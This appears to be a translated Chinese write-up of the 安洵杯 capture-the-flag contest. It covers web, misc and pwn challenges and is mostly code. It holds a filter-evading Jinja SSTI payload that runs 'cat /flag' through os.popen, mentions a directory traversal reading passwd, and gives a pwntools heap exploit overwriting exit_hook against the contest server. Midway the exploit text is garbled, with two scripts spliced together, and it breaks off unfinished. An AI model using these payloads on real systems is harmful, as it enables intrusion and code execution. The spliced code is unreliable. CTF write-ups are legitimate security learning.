# 0RAYS-安洵杯writeup
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
**四川的比赛，Web好难，但是web手秒了pwn**
* * *
## Web
###  Normal ssti
ban了很多，考虑8进制绕过
payload
    {%print(a|attr("\137\137\151\156\151\164\137\137")|attr("\137\137\147\154\157\142\141\154\163\137\137")|attr("\137\137\147\145\164\151\164\145\155\137\137")("\137\137\142\165\151\154\164\151\156\163\137\137")|attr("\137\137\147\145\164\151\164\145\155\137\137")("\145\166\141\154")("\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\160\157\160\145\156\50\47\143\141\164\40\57\146\154\141\147\47\51\56\162\145\141\144\50\51"))%}
## Misc
###  签到
关注公众号，回复fl4g，得到
下载得到一个flag.docx，里面有一串emoji，解码得到flag
###  套娃
下载文件得到一个hardzip.zip，里面还有一些只有几KB的密码文件，显然是CRC爆破，每个txt里的字符串长度均为2：
    import zlib
    import string
    import itertools
    yuan = 0xd6bb1bef
    print(string.printable)
    for i in itertools.product(string.printable, repeat=2):
        cc = ''.join(i)
        if yuan == zlib.crc32(cc.encode('utf-8')):
            print(cc)
            exit()
爆破完得到：
最终压缩包密码即为：!qQIdEa@#!z)
解开hardzip.zip，得到一个easyzip.zip
用bandizip或者winrar可以看到3个文件，因为头文件错误的问题有些压缩包看不到。
有两个CRC一模一样的文件，而且一个加密一个未加密，显然是明文攻击。
这里找软件很麻烦，最后用winrar成功
明文攻击得到压缩包密钥：%3#c$v!@
解开压缩包得到flag.txt：
    V20xa2NGa3hPV1ppYlRrd1lraDBkMk51WkdwWU1UazVXVmh2YlZreVZtaGFSMnhC
连续三次base64解码，得到：
    fgic__notl{prwc__}az&ceadi@
传统型栅栏密码解密，key为3，解得：
    flag{zip&crc_we_can_do_it}@
后面的@不要即为flag
###  王牌特工
下载压缩包得到一个findme文件
可以分离出两个有用的文件，flagbox和key.txt
key.txt里的数据为：
    key:a_cool_key
    use Veracrypt
下载Veracrypt，key为a_cool_key，解flagbox得到一个flag.txt：
这里说要回头看看，猜测可能原文件里有隐藏的东西。用DiskGenius恢复findme文件，得到：
把下面的密文用base64解码，得到：
    真的密码:this_is_a_true_key
重新利用Veracrypt装载，得到realflag：
    flag{you_are_a_cool_boy}
###  BeCare4
下载附件得到一个加密压缩包和一个npmtxt，用零宽字节解npmtxt里的字符串，解得：
    oh,you found the pass:RealV1siBle
解开压缩包得到一张女孩子的图片，jpg隐写搞了一遍，最后用SilentEye  
拖入SilentEye即可获得flag：
## PWN
###  web server
XRAY扫到了一个目录穿越漏洞，一把梭  
有一说一还有一个webpwn也有这个洞，但是似乎ban了flag，但能读到passwd
有一说一另一题
###  Einstein
json解析器name和passwd全错可以泄露libc，改exit_hook三个字节为one_gadget
    #!/usr/bin/python
    from pwn import *
    import sys
    context.log_level = 'debug'
    context.arch='amd64'
    local=0
    binary_name='sfs'
    libc_name='libc-2.23.so'
    if local:
        p=process("./"+binary_name)
        libc=ELF("./"+libc_name)
    else:
        p=remote('axb.d0g3.cn',20103)
        e=ELF("./"+binary_name)
        libc=ELF("./"+libc_name)
    def z(a=''):
        if local:
            gdb.attach(p,a)
            if a=='':
                raw_input
        else:
            pass
    ru=lambda x:p.recvuntil(x)
    sl=lambda x:p.sendline(x)
    sd=lambda x:p.send(x)
    sa=lambda a,b:p.sendafter(a,b)
    sla=lambda a,b:p.sendlineafter(a,b)
    ia=lambda :p.interactive()
    def leak_address():
        if(context.arch=='i386'):
            return u32(p.recv(4))
        else :
            return u64(p.recv(6).ljust(8,b'\x00'))
    payload = '''
    {
        "name": "a",
        "passwd": "b"
    }
    '''
    payload = payload.replace('\n','')
    def pwn():
        p.sendline(payload)
        p.recvuntil('logger:')
        p.recvuntil('logger:')
        libc_base = leak_address()-0x3c4b78
        print(hex(libc_base))
        if libc_base ",str(num))
    def add(size,content):
        cho(1)
        sla("size:",str(size))
        sa("description:",content)
    def delete(idx):
        cho(2)
        sla("index:",str(idx))
    while True:
        try:
            if local:
                    p=process("./"+binary_name)
            else:
                    p=remote('axb.d0g3.cn',20102)
            add(0x80,'a')
            add(0x10,'b')
            for i in range(8):
                    delete(0)
            delete(1)
            add(0x70,'\x60\x77')
            add(0x80,'c'*8)